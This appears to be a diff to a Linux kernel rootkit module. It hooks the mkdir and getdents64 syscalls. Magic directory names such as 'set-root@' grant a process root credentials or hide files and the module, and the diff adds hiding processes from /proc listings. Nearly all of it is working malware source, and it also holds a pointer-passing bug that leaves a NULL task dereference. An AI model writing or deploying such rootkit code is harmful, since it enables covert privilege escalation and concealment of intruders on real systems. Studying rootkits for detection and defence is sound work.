@@ -15,11 +15,9 @@ MODULE_VERSION("1.0.0");
 #define INLIST 1
 #define NOTINLIST 0
 
-void set_root(unsigned task_pid)
+void find_task(unsigned long task_pid, struct task_struct *task)
 {
     struct pid *proc_pid = find_vpid(task_pid);
-    struct task_struct *task;
-    struct cred *root;
 
     if(!proc_pid) 
     {
@@ -34,6 +32,14 @@ void set_root(unsigned task_pid)
       printk("rootkit: Failed to get this task info.\n");
       return;
     }
+}
+
+void set_root(unsigned long task_pid)
+{
+    struct task_struct *task = NULL;
+    struct cred *root;
+
+    find_task(task_pid, task);
 
     root = prepare_creds();
 
@@ -50,7 +56,7 @@ void set_root(unsigned task_pid)
     
     rcu_assign_pointer(task->cred, root);
 
-    printk(KERN_ALERT "rootkit: Process #%d is root now.\n", task_pid);
+    printk(KERN_ALERT "rootkit: Process #%lu is root now.\n", task_pid);
 }
 
 struct hide_file_list {
@@ -58,13 +64,23 @@ struct hide_file_list {
     unsigned long file_ino;
 };
 
+struct hide_process_list {
+    struct list_head list;
+    unsigned long pid_proc_ino;
+};
+
 struct hide_file_list *hide_files_head;
+struct hide_process_list *hide_processes_head;
 
 void init_links(void)
 {
     hide_files_head = kmalloc(GFP_KERNEL, sizeof(struct hide_file_list));
     hide_files_head->file_ino = 0;
     INIT_LIST_HEAD(&hide_files_head->list);
+    
+    hide_processes_head = kmalloc(GFP_KERNEL, sizeof(struct hide_process_list));
+    hide_processes_head->pid_proc_ino = 0;
+    INIT_LIST_HEAD(&hide_processes_head->list);
 }
 
 void add_hide_file(const char * filename)
@@ -77,7 +93,7 @@ void add_hide_file(const char * filename)
         INIT_LIST_HEAD(&temp_file->list);
         list_add_tail(&temp_file->list, &hide_files_head->list);
 
-        printk(KERN_INFO "rootkit: Hide file added: %s %d.\n", filename, target->f_inode->i_ino);
+        printk(KERN_INFO "rootkit: Hide file added: %s %lu.\n", filename, target->f_inode->i_ino);
     } else {
         printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
     }
@@ -97,7 +113,7 @@ void del_hide_file(const char * filename)
             }
         }
 
-        printk(KERN_INFO "rootkit: Hide file deleted: %s %d.\n", filename, target->f_inode->i_ino);
+        printk(KERN_INFO "rootkit: Hide file deleted: %s %lu.\n", filename, target->f_inode->i_ino);
     } else {
         printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
     }
@@ -108,6 +124,64 @@ int check_hide_file(unsigned long file_ino)
     struct hide_file_list *temp;
     list_for_each_entry(temp, &hide_files_head->list, list) {
         if(file_ino == temp->file_ino)
+        {
+            return INLIST;
+        }
+    }
+
+    return NOTINLIST;
+}
+
+
+void add_hide_process(const char * pid)
+{
+    char *process_proc = kmalloc(sizeof(char) * (strlen(pid) + 10), GFP_KERNEL);
+    struct file* target = NULL;
+    strcpy(process_proc, "/proc/");
+    strcat(process_proc, pid);
+    target = filp_open(process_proc, O_PATH, 0);
+    if(!IS_ERR(target)){
+        struct hide_process_list *temp_process = kmalloc(sizeof(struct hide_process_list), GFP_KERNEL);
+        temp_process->pid_proc_ino = target->f_inode->i_ino;
+        INIT_LIST_HEAD(&temp_process->list);
+        list_add_tail(&temp_process->list, &hide_processes_head->list);
+
+        printk(KERN_INFO "rootkit: Hide process added: %s.\n", pid);
+    } else {
+        printk(KERN_INFO "rootkit: No such process: %s.\n", pid);
+    }
+}
+
+
+void del_hide_process(const char * pid)
+{
+    char *process_proc = kmalloc(sizeof(char) * (strlen(pid) + 10), GFP_KERNEL);
+    struct hide_process_list *cursor, *temp;
+    struct file* target = NULL;
+    strcpy(process_proc, "/proc/");
+    strcat(process_proc, pid);
+    printk(KERN_DEBUG "rootkit: deleting %s\n", process_proc);
+    target = filp_open(process_proc, O_PATH, 0);
+    if(!IS_ERR(target)){
+        list_for_each_entry_safe(cursor, temp, &hide_processes_head->list, list) {
+            if(target->f_inode->i_ino == cursor->pid_proc_ino)
+            {
+                list_del(&cursor->list);
+                kfree(cursor);
+            }
+        }
+
+        printk(KERN_INFO "rootkit: Hide process deleted: %s.\n", pid);
+    } else {
+        printk(KERN_INFO "rootkit: No such process: %s.\n", pid);
+    }
+}
+
+int check_hide_process(unsigned long process_proc_ino)
+{
+    struct hide_process_list *temp;
+    list_for_each_entry(temp, &hide_processes_head->list, list) {
+        if(process_proc_ino == temp->pid_proc_ino)
         {
             return INLIST;
         }
@@ -169,7 +243,7 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     
     if(strncmp(dir_name, "set-root@", 9) == 0)
     {
-        set_root((unsigned)simple_strtol(&dir_name[5], (char **)(dir_name), 10));
+        set_root((unsigned long)simple_strtol(&dir_name[9], (char **)(dir_name), 10));
     } 
     else if(strncmp(dir_name, "hide-module@", 12) == 0) 
     {
@@ -187,6 +261,14 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     {
         del_hide_file(&dir_name[10]);
     } 
+    else if(strncmp(dir_name, "hide-process@", 13) == 0) 
+    {
+        add_hide_process(&dir_name[13]);
+    }
+    else if(strncmp(dir_name, "show-process@", 13) == 0) 
+    {
+        del_hide_process(&dir_name[13]);
+    } 
     else 
     {
         orig_mkdir(regs);
@@ -201,6 +283,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
     struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
     unsigned long offset = 0;
+    long error;
 
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
@@ -208,7 +291,6 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     if ( (ret <= 0) || (dirent_ker == NULL) )
         return ret;
 
-    long error;
     error = copy_from_user(dirent_ker, dirent, ret);
     if(error)
         goto done;
@@ -217,7 +299,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     {
         current_dir = (void *)dirent_ker + offset;
 
-        if (check_hide_file(current_dir->d_ino))
+        if (check_hide_file(current_dir->d_ino) || check_hide_process(current_dir->d_ino))
         {
             if(current_dir == dirent_ker)
             {
